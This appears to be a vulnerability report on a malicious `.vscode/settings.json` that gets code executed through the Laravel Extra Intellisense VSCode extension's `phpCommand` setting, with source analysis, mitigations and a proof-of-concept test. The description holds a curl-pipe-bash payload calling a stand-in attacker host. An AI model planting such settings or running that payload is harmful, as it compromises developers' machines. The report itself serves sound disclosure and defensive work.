- vulnerability name: Arbitrary Code Execution via Malicious Workspace Configuration
  - description: |
    1. An attacker crafts a malicious Laravel project and includes a `.vscode/settings.json` file in the project root.
    2. Within this `settings.json`, the attacker sets the `LaravelExtraIntellisense.phpCommand` configuration to a malicious command. For example, they might set it to `bash -c "curl attacker.com/malicious_script.sh | bash"` to download and execute a script from an external source, or simply `touch /tmp/pwned` for a local test.
    3. A developer, unaware of the malicious nature of the project, opens this Laravel project in VSCode, with the "Laravel Extra Intellisense" extension installed and enabled.
    4. Upon opening the project, the extension activates and automatically attempts to enhance the development experience by providing autocompletion features. To do this, it needs to gather information about the Laravel project's configuration, routes, views, etc.
    5. The extension uses the `Helpers.runLaravel` function to execute PHP code within the context of the opened Laravel project. This function is designed to run Laravel commands to extract necessary data for autocompletion.
    6. Crucially, `Helpers.runLaravel` relies on the `LaravelExtraIntellisense.phpCommand` configuration setting to determine how to execute PHP code.
    7. Because the attacker has maliciously modified the `phpCommand` setting in the project's `.vscode/settings.json`, the extension unwittingly executes the attacker's arbitrary command instead of the intended PHP code. This allows the attacker to run any code they desire on the developer's machine, with the same privileges as the VSCode process.
  - impact: Arbitrary code execution on the developer's machine. This can have severe consequences, including:
    - Data theft: Attackers could steal sensitive information from the developer's projects or personal files.
    - Malware installation: The attacker could install viruses, trojans, or other malicious software on the developer's system.
    - System compromise: Full control over the developer's machine could be achieved, allowing for further attacks and lateral movement within a network.
  - vulnerability rank: Critical
  - currently implemented mitigations:
    - Security Note in `README.md`: The extension's `README.md` file includes a "Security Note" section. This section advises users that the extension automatically and periodically runs their Laravel application to gather data for autocompletion. It warns about potential errors and suggests temporarily disabling the extension when working with sensitive code in service providers to prevent unwanted application execution. This serves as a documentation-based warning to security-conscious users.
  - missing mitigations:
    - Input sanitization/validation of `phpCommand`: The extension should sanitize or validate the `phpCommand` configuration setting to prevent execution of arbitrary commands. For example, it could verify that the command starts with `php` and reject any configuration that attempts to execute other commands directly.
    - Warning to user about modified `phpCommand`: VSCode or the extension could display a warning to the user when a workspace configuration modifies the `LaravelExtraIntellisense.phpCommand` setting, especially when it deviates from a safe default or a user-defined global setting.
    - Principle of least privilege: Ideally, the extension should not require the execution of arbitrary commands defined by user configuration. A safer approach would be to use a predefined, secure method for extracting Laravel project information, or to restrict the `phpCommand` to a very limited set of safe operations.
  - preconditions:
    - The developer must have the "Laravel Extra Intellisense" extension installed and enabled in VSCode.
    - The developer must open a malicious Laravel project that contains a malicious `.vscode/settings.json` file.
  - source code analysis: |
    - File: `src/helpers.ts`
    - Function: `runPhp(code: string, description: string|null = null)`
    ```typescript
    static async runPhp(code: string, description: string|null = null) : Promise<string> {
        code = code.replace(/\"/g, "\\\"");
        if (['linux', 'openbsd', 'sunos', 'darwin'].some(unixPlatforms => os.platform().includes(unixPlatforms))) {
            code = code.replace(/\$/g, "\\$");
            code = code.replace(/\\\\'/g, '\\\\\\\\\'');
            code = code.replace(/\\\\"/g, '\\\\\\\\\"');
        }
        let commandTemplate = vscode.workspace.getConfiguration("LaravelExtraIntellisense").get<string>('phpCommand') ?? "php -r \"{code}\""; // [CRITICAL]: phpCommand is directly taken from configuration
        let command = commandTemplate.replace("{code}", code); // [CRITICAL]: Malicious code from user config is placed into command
        let out = new Promise<string>(function (resolve, error) {
            if (description != null) {
                Helpers.outputChannel?.info("Laravel Extra Intellisense command started: " + description);
            }

            cp.exec(command, // [CRITICAL]: Command is executed without sanitization
                { cwd: vscode.workspace.workspaceFolders && vscode.workspace.workspaceFolders.length > 0 ? vscode.workspace.workspaceFolders[0].uri.fsPath : undefined },
                function (err, stdout, stderr) {
                    if (err == null) {
                        if (description != null) {
                            Helpers.outputChannel?.info("Laravel Extra Intellisense Resolved: " + description);
                        }
                        resolve(stdout);
                    } else {
                        const errorOutput = stderr.length > 0 ? stderr : stdout;
                        Helpers.outputChannel?.error("Laravel Extra Intellisense Error:\n " + (description ?? '') + '\n\n' + errorOutput);
                        Helpers.showErrorPopup();
                        error(errorOutput);
                    }
                }
            );
        });
        return out;
    }
    ```
    The `runPhp` function in `helpers.ts` retrieves the `phpCommand` from the extension's configuration without any sanitization or validation. It then uses `child_process.exec` to execute this command, substituting `{code}` with the PHP code intended to be run. If an attacker modifies the `phpCommand` in the workspace's `.vscode/settings.json` to inject malicious shell commands, these commands will be executed verbatim by `cp.exec` when the extension attempts to run PHP code for autocompletion.

    - Function: `runLaravel(code: string, description: string|null = null)`
    ```typescript
    static runLaravel(code: string, description: string|null = null) : Promise<string> {
        code = code.replace(/(?:\r\n|\r|\n)/g, ' ');
        if (fs.existsSync(Helpers.projectPath("vendor/autoload.php")) && fs.existsSync(Helpers.projectPath("bootstrap/app.php"))) {
            var command =
                "define('LARAVEL_START', microtime(true));" +
                "require_once '" + Helpers.projectPath("vendor/autoload.php", true) + "';" +
                "$app = require_once '" + Helpers.projectPath("bootstrap/app.php", true) + "';" +
                "class VscodeLaravelExtraIntellisenseProvider extends \\\\Illuminate\\\\Support\\\\ServiceProvider" +
                "{" +
                "   public function register() {}" +
                "	public function boot()" +
                "	{" +
                "       if (method_exists($this->app['log'], 'setHandlers')) {" +
                "			$this->app['log']->setHandlers([new \\\\Monolog\\\\Handler\\\\ProcessHandler()]);" +
                "		}" +
                "	}" +
                "}" +
                "$app->register(new VscodeLaravelExtraIntellisenseProvider($app));" +
                "$kernel = $app->make(Illuminate\\\\Contracts\\\\Console\\\\Kernel::class);" +

                "$status = $kernel->handle(" +
                    "$input = new Symfony\\\\Component\\\\Console\\\\Input\\\\ArgvInput," +
                    "new Symfony\\\\Component\\\\Console\\\\Output\\\\ConsoleOutput" +
                ");" +
                "if ($status == 0) {" +
                "	echo '___VSCODE_LARAVEL_EXTRA_INSTELLISENSE_OUTPUT___';" +
                    code + // [CRITICAL]: User provided code is embedded into Laravel bootstrap code.
                "	echo '___VSCODE_LARAVEL_EXTRA_INSTELLISENSE_END_OUTPUT___';" +
                "}" +
                "$kernel->terminate($input, $status);" +
                "exit($status);"

            var self = this;

            return new Promise(function (resolve, error) {
                self.runPhp(command, description) // [CALL]: Calls runPhp to execute the constructed command.
                    .then(function (result: string) {
                        var out : string | null | RegExpExecArray = result;
                        out = /___VSCODE_LARAVEL_EXTRA_INSTELLISENSE_OUTPUT___(.*)___VSCODE_LARAVEL_EXTRA_INSTELLISENSE_END_OUTPUT___/g.exec(out);
                        if (out) {
                            resolve(out[1]);
                        } else {
                            error("PARSE ERROR: " + result);

                            Helpers.outputChannel?.error("Laravel Extra Intellisense Parse Error:\n " + (description ?? '') + '\n\n' + result);
                            Helpers.showErrorPopup();
                        }
                    })
                    .catch(function (e : Error) {
                        error(e);
                    });
            });
        }
        return new Promise((resolve, error) => resolve(""));
    }
    ```
    The `runLaravel` function constructs a string that includes Laravel bootstrapping code and the `$code` parameter, which represents the PHP code the extension needs to execute. This entire string is then passed to `runPhp` for execution. This confirms that any code passed to `runLaravel` will be executed using the potentially malicious `phpCommand`.

  - security test case: |
    1. **Setup Malicious Project:**
       - Create a new directory named `malicious-laravel-project`.
       - Inside `malicious-laravel-project`, initialize a basic Laravel project (you don't need a fully functional Laravel application, just the basic structure). You can use `laravel new .` if you have the Laravel installer, or manually create the basic file structure including `artisan`, `composer.json`, `public`, `bootstrap`, `vendor` directories (even empty vendor is enough for this test).
       - Create a `.vscode` directory inside `malicious-laravel-project`.
       - Inside `.vscode`, create a `settings.json` file.
       - Add the following JSON content to `.vscode/settings.json` to set a malicious `phpCommand`:
         ```json
         {
           "LaravelExtraIntellisense.phpCommand": "bash -c \\"touch /tmp/pwned_by_vscode_extension\\""
         }
         ```
         This command will attempt to create a file named `pwned_by_vscode_extension` in the `/tmp/` directory when the extension runs.

    2. **Open Malicious Project in VSCode:**
       - Open VSCode.
       - Ensure the "Laravel Extra Intellisense" extension is installed and enabled.
       - Open the `malicious-laravel-project` folder in VSCode using "File" > "Open Folder...".

    3. **Trigger Extension Activity:**
       - Open any PHP file within the opened project (e.g., create a file `test.php` in the project root with `<?php `). This should trigger the extension to become active and attempt to run PHP code. You might need to start typing a Laravel function or trigger autocompletion in a blade file to ensure the extension kicks in. Wait for a short period (e.g., 30 seconds) to allow the extension to execute its background tasks.

    4. **Verify Exploitation:**
       - Open a terminal on your system.
       - Check if the file `/tmp/pwned_by_vscode_extension` exists by running the command `ls /tmp/pwned_by_vscode_extension`.
       - If the file `/tmp/pwned_by_vscode_extension` exists, it confirms that the malicious command injected via `.vscode/settings.json` was executed by the "Laravel Extra Intellisense" extension, demonstrating arbitrary code execution vulnerability.

    **Note:**
    - If the test is successful, remember to delete the `/tmp/pwned_by_vscode_extension` file.
    - For more robust testing in different environments, you might want to use a more visible and less intrusive payload, such as logging to a file within the project directory instead of creating a file in `/tmp`. However, `touch /tmp/pwned_by_vscode_extension` is simple and effective for a basic proof of concept.
    - This test assumes a Unix-like environment where `bash` and `touch` commands are available. For Windows, you would need to adjust the `phpCommand` to use Windows commands (e.g., `cmd /c "echo pwned > C:\TEMP\pwned_by_vscode_extension.txt"` and check for the file in `C:\TEMP`).
